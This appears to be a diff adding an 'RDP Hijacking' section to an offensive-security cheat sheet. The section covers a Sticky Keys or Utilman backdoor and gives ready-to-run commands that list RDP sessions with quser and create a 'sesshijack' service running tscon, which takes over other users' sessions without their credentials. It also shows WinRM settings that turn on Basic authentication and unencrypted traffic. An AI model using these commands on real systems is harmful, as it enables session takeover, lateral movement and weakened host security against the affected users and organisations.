@@ -117,5 +117,47 @@
 
 \\\\\\\\\\\\\\\\\\\\\\
 
+### RDP Hijacking
+
+If you have SYSTEM context on a host, you can assume the RDP sessions of other users without credentials using the tscon.exe command.
+
+Gain access to cmd.exe to issue the tscon.exe command over RDP by creating a backdoor with Stickkeys or Utilman. Use scheduled tasks (as SYSTEM) or create a service to execute the desired command.
+
+[RDP hijacking — how to hijack RDS and RemoteApp sessions transparently to move through an organisation](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6)
+```
+	# View RDP sessions on system your RDP'd to with administrative permissions
+	# Locally
+	quser
+
+	# Remote
+	quser /server:<servername>
+
+	# Create a service that will swap your SESSIONNAME with the desired disconnected session 
+	sc create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#XX" error= "ignore"
+
+	# Start service
+	net start sesshijack
+	or
+	sc start sesshijack
+```
+
+Linux to Windows Remoting
+
+  - In windows run
+```
+    winrm set winrm/config/Service/Auth @{Basic="true"}
+    winrm set winrm/config/Service @{AllowUnencrypted="true"}
+```
+
+  - In linux run
+```
+    $cred = Get-Credential
+    Enter-PSSession -ComputerName 'winserver1' -Credential $cred -Authentication Basic
+```
+
+PowerShell Remoting over SSH
+```
+    Enter-PSSession -Hostname <IP or FQDN> -Username james -SSHTransport
+```    
 
 
